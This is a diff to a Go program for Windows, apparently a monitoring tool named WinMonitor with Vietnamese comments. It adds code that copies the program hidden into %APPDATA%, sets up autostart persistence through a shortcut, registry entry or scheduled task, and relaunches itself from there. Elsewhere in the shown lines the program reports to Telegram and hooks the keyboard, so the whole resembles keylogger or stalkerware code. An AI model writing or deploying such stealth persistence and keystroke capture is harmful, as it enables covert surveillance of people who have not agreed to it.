@@ -1515,6 +1515,27 @@ func main() {
 		logMsg("Cảnh báo: không kết nối được Telegram lúc khởi động (sẽ thử lại).")
 	}
 
+	// === INSTALL & HAND-OFF ===
+	// Nếu đang chạy từ file ngoài (vd: vừa tải về Downloads), cài bản chuẩn vào
+	// %APPDATA%\WinMonitor rồi chuyển sang chạy bản đó. Nhờ vậy file tải về KHÔNG
+	// bị khóa và có thể xóa sau khi chạy (cấu hình đã lưu trong config.json).
+	self, _ := os.Executable()
+	if filepath.Clean(self) != filepath.Clean(deployExe) {
+		if copyHidden(self, deployExe) {
+			ensurePersistence() // tạo shortcut/registry/scheduled task trỏ tới bản chuẩn
+			releaseSingleInstance()
+			if err := relaunchCanonical(nil); err == nil {
+				logMsg("Đã cài vào %APPDATA% và chuyển sang bản chuẩn. File tải về có thể xóa.")
+				return
+			}
+			// Không relaunch được -> tiếp tục chạy tại chỗ (vẫn hoạt động bình thường)
+			acquireSingleInstance()
+			logMsg("Không tự chuyển được sang bản chuẩn; tiếp tục chạy tại chỗ.")
+		} else {
+			logMsg("Không copy được vào %APPDATA%; tiếp tục chạy tại chỗ.")
+		}
+	}
+
 	AutoUnblockNotify = func() { notify("🔓 Đã tự KẾT NỐI LẠI bàn phím & chuột (hết thời hạn an toàn).") }
 
 	hookOK = startKeyboardHook(keySink)
